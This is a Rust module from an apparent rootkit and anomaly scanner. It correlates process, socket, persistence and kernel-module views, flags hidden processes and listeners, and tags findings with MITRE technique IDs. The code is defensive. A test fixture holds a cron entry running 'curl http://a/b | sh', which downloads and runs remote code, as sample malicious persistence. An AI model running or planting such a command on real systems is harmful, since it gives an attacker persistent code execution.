//! Orchestrates a full scan: gathers every layer in parallel, confirms
//! discrepancies against races, scores and annotates the result.

use crate::baseline::Baseline;
use crate::config::Suppressions;
use crate::engine::anomaly::{AnomalyAnalyzer, GhostKind};
use crate::engine::portprobe;
use crate::engine::{CancelToken, EngineError, TruthEngine};
use crate::model::*;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::io::Read;
use std::sync::Mutex;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
#[serde(default)]
pub struct ScanOptions {
    /// Probe the entire PID space to find kernel-hidden processes.
    pub brute_force_pids: bool,
    /// Bind-probe every port to find hidden listeners.
    pub port_probe: bool,
    pub persistence: bool,
    pub kernel_modules: bool,
    /// SHA-256 executables referenced by findings (for IOC lookups).
    pub hash_evidence: bool,
    /// Re-verification passes before a discrepancy is reported.
    pub confirm_rounds: usize,
}

impl Default for ScanOptions {
    fn default() -> Self {
        ScanOptions { brute_force_pids: true, port_probe: true, persistence: true, kernel_modules: true, hash_evidence: true, confirm_rounds: 3 }
    }
}

impl ScanOptions {
    pub fn quick() -> Self {
        ScanOptions { brute_force_pids: false, port_probe: false, hash_evidence: false, ..Default::default() }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Progress {
    pub stage: String,
    pub percent: u8,
    pub message: String,
}

const STAGES: &[(&str, u32)] = &[("processes", 30), ("network", 20), ("persistence", 25), ("modules", 10), ("integrity", 5), ("analysis", 10)];

struct Tracker<'a> {
    done: Mutex<u32>,
    cb: &'a (dyn Fn(Progress) + Sync),
}

impl Tracker<'_> {
    fn emit(&self, stage: &str, message: impl Into<String>, completed: bool) {
        let mut d = self.done.lock().unwrap_or_else(|e| e.into_inner());
        if completed {
            *d += STAGES.iter().find(|(s, _)| *s == stage).map(|(_, w)| *w).unwrap_or(0);
        }
        let pct = (*d).min(100) as u8;
        (self.cb)(Progress { stage: stage.into(), percent: pct, message: message.into() });
    }
}

pub struct Scanner {
    engine: Box<dyn TruthEngine>,
}

struct ProcStageOut {
    processes: Vec<ProcessInfo>,
    ghosts: Vec<(ProcessInfo, GhostKind)>,
}

struct NetStageOut {
    sockets: Vec<SocketInfo>,
    hidden: Vec<(Protocol, u16)>,
    note: Option<String>,
}

fn now_secs() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn timed<T>(stage: &str, f: impl FnOnce() -> Result<T, EngineError>) -> (Option<T>, StageStatus) {
    let t = Instant::now();
    let r = f();
    let ms = t.elapsed().as_millis() as u64;
    match r {
        Ok(v) => (Some(v), StageStatus { stage: stage.into(), ok: true, duration_ms: ms, message: None }),
        Err(e) => (None, StageStatus { stage: stage.into(), ok: false, duration_ms: ms, message: Some(e.to_string()) }),
    }
}

impl Default for Scanner {
    fn default() -> Self {
        Self::new()
    }
}

impl Scanner {
    pub fn new() -> Self {
        Scanner { engine: crate::engine::platform_engine() }
    }

    pub fn with_engine(engine: Box<dyn TruthEngine>) -> Self {
        Scanner { engine }
    }

    pub fn engine(&self) -> &dyn TruthEngine {
        self.engine.as_ref()
    }

    pub fn run(
        &self,
        opts: &ScanOptions,
        suppressions: &Suppressions,
        baseline: Option<&Baseline>,
        cancel: &CancelToken,
        progress: &(dyn Fn(Progress) + Sync),
    ) -> ScanReport {
        let started = Instant::now();
        let started_at = now_secs();
        let tracker = Tracker { done: Mutex::new(0), cb: progress };
        let engine = self.engine.as_ref();
        tracker.emit("processes", "Starting cross-layer scan", false);

        let (proc_res, net_res, persist_res, mod_res, integ) = std::thread::scope(|s| {
            let t = &tracker;
            let h_proc = s.spawn(move || {
                t.emit("processes", "Enumerating processes across API, syscall and brute-force layers", false);
                let r = timed("processes", || self.process_stage(opts, cancel));
                t.emit("processes", "Process truth analysis complete", true);
                r
            });
            let h_net = s.spawn(move || {
                t.emit("network", "Reading socket tables and probing ports", false);
                let r = timed("network", || self.network_stage(opts, cancel));
                t.emit("network", "Network truth analysis complete", true);
                r
            });
            let h_rest = s.spawn(move || {
                let p = if opts.persistence {
                    t.emit("persistence", "Enumerating autostart locations", false);
                    let r = timed("persistence", || engine.scan_persistence());
                    t.emit("persistence", "Persistence enumeration complete", true);
                    r
                } else {
                    t.emit("persistence", "Persistence skipped", true);
                    (Some(vec![]), StageStatus { stage: "persistence".into(), ok: true, duration_ms: 0, message: Some("skipped".into()) })
                };
                let m = if opts.kernel_modules && !cancel.is_cancelled() {
                    t.emit("modules", "Cross-checking kernel modules", false);
                    let r = timed("modules", || engine.scan_kernel_modules());
                    t.emit("modules", "Kernel module analysis complete", true);
                    r
                } else {
                    t.emit("modules", "Kernel modules skipped", true);
                    (Some(vec![]), StageStatus { stage: "modules".into(), ok: true, duration_ms: 0, message: Some("skipped".into()) })
                };
                t.emit("integrity", "Running integrity checks", false);
                let i = timed("integrity", || Ok(engine.integrity_checks()));
                t.emit("integrity", "Integrity checks complete", true);
                (p, m, i)
            });
            let proc_res = h_proc.join().unwrap_or_else(|_| (None, panic_status("processes")));
            let net_res = h_net.join().unwrap_or_else(|_| (None, panic_status("network")));
            let (p, m, i) =
                h_rest.join().unwrap_or_else(|_| ((None, panic_status("persistence")), (None, panic_status("modules")), (None, panic_status("integrity"))));
            (proc_res, net_res, p, m, i)
        });

        tracker.emit("analysis", "Correlating findings", false);
        let mut stages = vec![proc_res.1, net_res.1, persist_res.1, mod_res.1, integ.1];
        let proc_out = proc_res.0.unwrap_or(ProcStageOut { processes: vec![], ghosts: vec![] });
        let net_out = net_res.0.unwrap_or(NetStageOut { sockets: vec![], hidden: vec![], note: None });
        if let Some(n) = &net_out.note {
            if let Some(s) = stages.iter_mut().find(|s| s.stage == "network") {
                s.message = Some(n.clone());
            }
        }
        let mut processes = proc_out.processes;
        let mut sockets = net_out.sockets;
        let persistence = persist_res.0.unwrap_or_default();
        let modules = mod_res.0.unwrap_or_default();
        let mut findings: Vec<Finding> = integ.0.unwrap_or_default();

        // Ghost processes.
        for (g, kind) in &proc_out.ghosts {
            let merged = processes.iter().find(|p| p.pid == g.pid).unwrap_or(g);
            let mut f = AnomalyAnalyzer::ghost_finding(merged, *kind);
            if g.flags.iter().any(|x| x.contains("unverified")) {
                // Without privileges we cannot tell a hidden process from an
                // exited one whose handle is still held (a zombie).
                f.severity = Severity::Low;
                f.title = format!("Unverified process discrepancy: PID {}", g.pid);
                f.evidence.push(
                    "access denied: liveness cannot be verified without root/Administrator; most often a terminated process whose handle is still open".into(),
                );
                f.recommendation = "Re-run the scan elevated to confirm or dismiss this discrepancy.".into();
            }
            findings.push(f);
        }
        // Process heuristics.
        findings.extend(engine.inspect_processes(&processes));
        // Sockets.
        findings.extend(AnomalyAnalyzer::analyze_sockets(&mut sockets, &processes));
        for (proto, port) in &net_out.hidden {
            let mut f = AnomalyAnalyzer::hidden_socket_finding(*proto, *port);
            if matches!(proto, Protocol::Tcp | Protocol::Tcp6) {
                f.evidence.push("the port accepted a TCP connection: an active, invisible listener".into());
            }
            findings.push(f);
            sockets.push(SocketInfo {
                local_address: "*".into(),
                local_port: *port,
                remote_address: "*".into(),
                remote_port: 0,
                protocol: *proto,
                state: "HIDDEN".into(),
                pid: None,
                process_name: None,
                suspicious: true,
                hidden: true,
                reasons: vec!["port bound in kernel but absent from socket table".into()],
            });
        }
        // Persistence.
        for p in persistence.iter().filter(|p| p.risk_level >= Severity::Medium) {
            findings.push(
                Finding::new(
                    FindingCategory::Persistence,
                    p.risk_level,
                    &format!("{}|{}", p.location, p.command),
                    format!("Suspicious {} persistence: {}", p.mechanism, short(&p.location, 90)),
                    "An autostart entry launches content matching malicious patterns or from a high-risk location.",
                )
                .evidence(format!("location: {}", p.location))
                .evidence(format!("command: {}", short(&p.command, 400)))
                .evidences(p.reasons.clone())
                .path(p.target_path.clone())
                .mitre(persistence_mitre(&p.mechanism))
                .recommend("Verify the entry's owner and purpose. Remove it and the referenced file if unauthorised, then hunt for the initial access vector."),
            );
        }
        findings.extend(AnomalyAnalyzer::module_findings(&modules));

        let mut report = ScanReport {
            scan_id: String::new(),
            tool_version: crate::VERSION.into(),
            started_at,
            duration_ms: 0,
            engine: engine.name().into(),
            elevated: engine.is_elevated(),
            host: host_info(),
            risk_score: 0,
            summary: ScanSummary::default(),
            findings: Vec::new(),
            processes: Vec::new(),
            sockets,
            persistence,
            modules,
            stages: Vec::new(),
            cancelled: cancel.is_cancelled(),
        };
        if let Some(b) = baseline {
            report.processes = processes.clone();
            findings.extend(b.drift(&report));
        }

        // De-duplicate by id, keeping the most severe.
        let mut by_id: HashMap<String, Finding> = HashMap::new();
        for f in findings {
            match by_id.get_mut(&f.id) {
                Some(existing) if existing.severity >= f.severity => {
                    for e in f.evidence {
                        if !existing.evidence.contains(&e) {
                            existing.evidence.push(e);
                        }
                    }
                }
                _ => {
                    by_id.insert(f.id.clone(), f);
                }
            }
        }
        let mut findings: Vec<Finding> = by_id.into_values().collect();

        if opts.hash_evidence {
            let mut cache: HashMap<String, Option<String>> = HashMap::new();
            for f in findings.iter_mut().filter(|f| f.severity >= Severity::Medium) {
                if let Some(p) = f.path.clone() {
                    let h = cache.entry(p.clone()).or_insert_with(|| sha256_file(p.trim_end_matches(" (deleted)")));
                    if let Some(h) = h {
                        f.evidence.push(format!("sha256: {h}"));
                    }
                }
            }
            for p in processes.iter_mut() {
                if let Some(Some(h)) = cache.get(&p.path) {
                    p.sha256 = Some(h.clone());
                }
            }
        }

        // Annotate processes with their findings so the process view can highlight them.
        for f in &findings {
            if let Some(pid) = f.pid {
                if let Some(p) = processes.iter_mut().find(|p| p.pid == pid) {
                    let flag = f.title.clone();
                    if !p.flags.contains(&flag) {
                        p.flags.push(flag);
                    }
                }
            }
        }

        suppressions.apply(&mut findings);
        findings
            .sort_by(|a, b| a.suppressed.cmp(&b.suppressed).then(b.severity.cmp(&a.severity)).then(a.category.cmp(&b.category)).then(a.title.cmp(&b.title)));

        report.risk_score = AnomalyAnalyzer::risk_score(&findings);
        report.summary = summarize(&processes, &report.sockets, &report.persistence, &report.modules, &findings);
        report.findings = findings;
        report.processes = processes;
        stages.push(StageStatus { stage: "analysis".into(), ok: true, duration_ms: 0, message: None });
        report.stages = stages;
        report.duration_ms = started.elapsed().as_millis() as u64;
        report.scan_id = format!("{:x}-{:08x}", started_at, (stable_hash(&format!("{}{}", report.host.hostname, report.duration_ms)) & 0xffff_ffff));
        report.cancelled = cancel.is_cancelled();
        tracker.emit("analysis", if report.cancelled { "Scan cancelled — partial results" } else { "Scan complete" }, true);
        report
    }

    fn process_stage(&self, opts: &ScanOptions, cancel: &CancelToken) -> Result<ProcStageOut, EngineError> {
        let e = self.engine.as_ref();
        let api = e.scan_user_space()?;
        cancel.check()?;
        let (syscall, sys_ok) = match e.scan_syscall_view() {
            Ok(v) => (v.into_iter().collect::<HashSet<u32>>(), true),
            Err(_) => (HashSet::new(), false),
        };
        let brute_infos = if opts.brute_force_pids { e.scan_kernel_reality(cancel)? } else { vec![] };
        let brute: HashSet<u32> = brute_infos.iter().map(|p| p.pid).collect();
        let api_set: HashSet<u32> = api.iter().map(|p| p.pid).collect();

        let candidates = AnomalyAnalyzer::classify_ghosts(&api_set, &syscall, &brute, sys_ok);
        let confirmed = AnomalyAnalyzer::confirm_ghosts(
            candidates,
            |pid| e.pid_alive(pid),
            || {
                std::thread::sleep(Duration::from_millis(150));
                e.api_pids().map(|v| v.into_iter().collect()).unwrap_or_default()
            },
            opts.confirm_rounds.max(1),
        );
        // Reclassify against a fresh syscall view.
        let fresh_sys: HashSet<u32> = if sys_ok { e.scan_syscall_view().map(|v| v.into_iter().collect()).unwrap_or_default() } else { HashSet::new() };
        let by_pid: HashMap<u32, &ProcessInfo> = brute_infos.iter().map(|p| (p.pid, p)).collect();
        let ghosts: Vec<(ProcessInfo, GhostKind)> = confirmed
            .into_iter()
            .map(|(pid, _)| {
                let kind = if sys_ok && fresh_sys.contains(&pid) { GhostKind::UserModeHook } else { GhostKind::KernelHidden };
                let info = by_pid.get(&pid).map(|p| (*p).clone()).unwrap_or(ProcessInfo { pid, ..Default::default() });
                (info, kind)
            })
            .collect();
        let processes = AnomalyAnalyzer::merge_process_views(api, &syscall, &brute, &ghosts, sys_ok);
        Ok(ProcStageOut { processes, ghosts })
    }

    fn network_stage(&self, opts: &ScanOptions, cancel: &CancelToken) -> Result<NetStageOut, EngineError> {
        let e = self.engine.as_ref();
        let table = e.scan_network_sockets()?;
        if !opts.port_probe {
            return Ok(NetStageOut { sockets: table, hidden: vec![], note: Some("port probing disabled".into()) });
        }
        let first = portprobe::first_probe_port(e.is_elevated());
        let threads = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(4).clamp(2, 16);
        let mut bound: Vec<(Protocol, u16)> = Vec::new();
        // Sequential per protocol family: a dual-stack v6 probe would otherwise
        // collide with our own concurrent v4 probe of the same port.
        for proto in [Protocol::Tcp, Protocol::Tcp6, Protocol::Udp, Protocol::Udp6] {
            match portprobe::bound_ports(proto, first, 65535, threads, cancel) {
                Ok(ports) => bound.extend(ports.into_iter().map(|p| (proto, p))),
                Err(EngineError::Cancelled) => return Err(EngineError::Cancelled),
                Err(_) => {}
            }
        }
        let mut candidates = AnomalyAnalyzer::hidden_ports(&table, &bound);
        candidates.dedup_by(|a, b| a.1 == b.1 && family(a.0) == family(b.0));
        // Confirm: the port must still be bound and still absent from a fresh table.
        for _ in 0..opts.confirm_rounds.max(1) {
            if candidates.is_empty() {
                break;
            }
            std::thread::sleep(Duration::from_millis(150));
            let fresh = e.scan_network_sockets()?;
            candidates.retain(|(proto, port)| {
                portprobe::probe_one(*proto, *port) == portprobe::BindOutcome::InUse && !AnomalyAnalyzer::hidden_ports(&fresh, &[(*proto, *port)]).is_empty()
            });
        }
        // TCP sockets that are merely bound (never listening, e.g. a client
        // socket before connect) are legitimately absent from socket tables
        // on both Linux and Windows. Only a port that also *accepts a
        // connection* is a hidden listener.
        let local_ips = portprobe::local_addresses(&table);
        let mut bound_only = 0usize;
        candidates.retain(|(proto, port)| match proto {
            Protocol::Tcp | Protocol::Tcp6 => {
                let listening = portprobe::accepts_connection(*port, &local_ips);
                bound_only += usize::from(!listening);
                listening
            }
            _ => true,
        });
        let mut notes = Vec::new();
        if first > 1 {
            notes.push(format!("ports below {first} not probed (requires elevation)"));
        }
        if bound_only > 0 {
            notes.push(format!("{bound_only} TCP port(s) bound without listening (normal; not shown in socket tables)"));
        }
        let note = if notes.is_empty() { None } else { Some(notes.join("; ")) };
        Ok(NetStageOut { sockets: table, hidden: candidates, note })
    }
}

fn family(p: Protocol) -> u8 {
    match p {
        Protocol::Tcp | Protocol::Tcp6 => 0,
        Protocol::Udp | Protocol::Udp6 => 1,
        _ => 2,
    }
}

fn panic_status(stage: &str) -> StageStatus {
    StageStatus { stage: stage.into(), ok: false, duration_ms: 0, message: Some("stage panicked".into()) }
}

fn short(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(n).collect::<String>())
    }
}

fn persistence_mitre(mech: &str) -> &'static str {
    match mech {
        "cron" | "cron-user" | "cron-periodic" => "T1053.003",
        "at-job" => "T1053.002",
        "systemd" | "systemd-vendor" | "systemd-generator" => "T1543.002",
        "rc.local" | "init.d" => "T1037.004",
        "shell-profile" => "T1546.004",
        "ld.so.preload" => "T1574.006",
        "xdg-autostart" => "T1547.013",
        "ssh-authorized-key" => "T1098.004",
        "udev-rule" => "T1546.017",
        "pam" => "T1556.003",
        "motd" => "T1037",
        "registry-run" => "T1547.001",
        "winlogon" => "T1547.004",
        "ifeo-debugger" | "silent-process-exit" => "T1546.012",
        "appinit-dlls" => "T1546.010",
        "appcert-dlls" => "T1546.009",
        "boot-execute" => "T1547.001",
        "lsa-package" => "T1547.002",
        "netsh-helper" => "T1546.007",
        "print-monitor" => "T1547.010",
        "service" | "driver-service" => "T1543.003",
        "startup-folder" => "T1547.001",
        "scheduled-task" => "T1053.005",
        "com-hijack" => "T1546.015",
        "wmi-subscription" => "T1546.003",
        _ => "T1547",
    }
}

pub fn summarize(
    processes: &[ProcessInfo],
    sockets: &[SocketInfo],
    persistence: &[PersistenceEntry],
    modules: &[KernelModule],
    findings: &[Finding],
) -> ScanSummary {
    let active = || findings.iter().filter(|f| !f.suppressed);
    ScanSummary {
        processes: processes.len(),
        hidden_processes: processes.iter().filter(|p| p.is_discrepant).count(),
        sockets: sockets.len(),
        listening: sockets.iter().filter(|s| s.state == "LISTEN").count(),
        hidden_sockets: sockets.iter().filter(|s| s.hidden).count(),
        persistence_entries: persistence.len(),
        modules: modules.len(),
        hidden_modules: modules.iter().filter(|m| m.hidden).count(),
        critical: active().filter(|f| f.severity == Severity::Critical).count(),
        high: active().filter(|f| f.severity == Severity::High).count(),
        medium: active().filter(|f| f.severity == Severity::Medium).count(),
        low: active().filter(|f| f.severity == Severity::Low).count(),
        info: active().filter(|f| f.severity == Severity::Info).count(),
        suppressed: findings.iter().filter(|f| f.suppressed).count(),
    }
}

pub fn host_info() -> HostInfo {
    use sysinfo::System;
    HostInfo {
        hostname: System::host_name().unwrap_or_default(),
        os: System::long_os_version().or_else(System::name).unwrap_or_else(|| std::env::consts::OS.into()),
        os_version: System::os_version().unwrap_or_default(),
        kernel_version: System::kernel_version().unwrap_or_default(),
        arch: std::env::consts::ARCH.into(),
        uptime_secs: System::uptime(),
    }
}

/// Hash files up to 256 MiB; larger files are skipped to bound scan time.
pub fn sha256_file(path: &str) -> Option<String> {
    use sha2::{Digest, Sha256};
    if path.is_empty() {
        return None;
    }
    let meta = std::fs::metadata(path).ok()?;
    if !meta.is_file() || meta.len() > 256 * 1024 * 1024 {
        return None;
    }
    let mut f = std::fs::File::open(path).ok()?;
    let mut h = Sha256::new();
    let mut buf = vec![0u8; 1 << 16];
    loop {
        let n = f.read(&mut buf).ok()?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    Some(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::{EngineResult, ProcessAction};

    /// A fake engine simulating a kernel rootkit hiding PID 666 and a
    /// process that starts mid-scan (PID 777) which must NOT be reported.
    struct FakeEngine {
        api_calls: Mutex<u32>,
    }

    fn p(pid: u32, name: &str, path: &str) -> ProcessInfo {
        ProcessInfo { pid, name: name.into(), path: path.into(), ..Default::default() }
    }

    impl TruthEngine for FakeEngine {
        fn name(&self) -> &'static str {
            "fake"
        }
        fn is_elevated(&self) -> bool {
            true
        }
        fn scan_user_space(&self) -> EngineResult<Vec<ProcessInfo>> {
            Ok(vec![p(1, "init", "/sbin/init"), p(10, "bash", "/bin/bash")])
        }
        fn api_pids(&self) -> EngineResult<Vec<u32>> {
            *self.api_calls.lock().unwrap() += 1;
            Ok(vec![1, 10, 777])
        }
        fn scan_syscall_view(&self) -> EngineResult<Vec<u32>> {
            Ok(vec![1, 10, 777])
        }
        fn scan_kernel_reality(&self, _: &CancelToken) -> EngineResult<Vec<ProcessInfo>> {
            Ok(vec![p(1, "init", "/sbin/init"), p(10, "bash", "/bin/bash"), p(666, "rootkitd", "/tmp/.r/rootkitd"), p(777, "new", "/usr/bin/new")])
        }
        fn pid_alive(&self, pid: u32) -> bool {
            pid != 999
        }
        fn scan_network_sockets(&self) -> EngineResult<Vec<SocketInfo>> {
            Ok(vec![])
        }
        fn scan_persistence(&self) -> EngineResult<Vec<PersistenceEntry>> {
            Ok(vec![PersistenceEntry {
                mechanism: "cron".into(),
                location: "/etc/cron.d/x".into(),
                target_path: "/tmp/x".into(),
                command: "curl http://a/b | sh".into(),
                risk_level: Severity::High,
                reasons: vec!["downloads".into()],
                modified: None,
            }])
        }
        fn scan_kernel_modules(&self) -> EngineResult<Vec<KernelModule>> {
            Err(EngineError::PermissionDenied)
        }
        fn inspect_processes(&self, _: &[ProcessInfo]) -> Vec<Finding> {
            vec![]
        }
        fn integrity_checks(&self) -> Vec<Finding> {
            vec![]
        }
        fn act_on_process(&self, _: u32, _: u64, _: ProcessAction) -> EngineResult<()> {
            Ok(())
        }
    }

    #[test]
    fn end_to_end_with_fake_rootkit() {
        let s = Scanner::with_engine(Box::new(FakeEngine { api_calls: Mutex::new(0) }));
        let opts = ScanOptions { port_probe: false, ..Default::default() };
        let events = Mutex::new(Vec::new());
        let r = s.run(&opts, &Suppressions::default(), None, &CancelToken::new(), &|p| events.lock().unwrap().push(p));
        let ghosts: Vec<_> = r.processes.iter().filter(|p| p.is_discrepant).collect();
        assert_eq!(ghosts.len(), 1, "only the rootkit process is a ghost");
        assert_eq!(ghosts[0].pid, 666);
        assert!(r.findings.iter().any(|f| f.category == FindingCategory::HiddenProcess && f.severity == Severity::Critical));
        assert!(r.findings.iter().any(|f| f.category == FindingCategory::Persistence));
        assert!(r.risk_score >= 70);
        let modules = r.stages.iter().find(|s| s.stage == "modules").unwrap();
        assert!(!modules.ok, "failed stages are surfaced, not hidden");
        let ev = events.lock().unwrap();
        assert_eq!(ev.last().unwrap().percent, 100);
    }

    #[test]
    fn suppression_and_baseline() {
        let s = Scanner::with_engine(Box::new(FakeEngine { api_calls: Mutex::new(0) }));
        let opts = ScanOptions { port_probe: false, ..Default::default() };
        let r1 = s.run(&opts, &Suppressions::default(), None, &CancelToken::new(), &|_| {});
        let mut sup = Suppressions::default();
        for f in &r1.findings {
            sup.finding_ids.insert(f.id.clone());
        }
        let b = Baseline::from_report(&r1);
        let r2 = s.run(&opts, &sup, Some(&b), &CancelToken::new(), &|_| {});
        assert!(r2.findings.iter().all(|f| f.suppressed));
        assert_eq!(r2.risk_score, 0);
    }

    #[test]
    fn hashing() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("a");
        std::fs::write(&f, b"abc").unwrap();
        assert_eq!(sha256_file(f.to_str().unwrap()).unwrap(), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    }
}
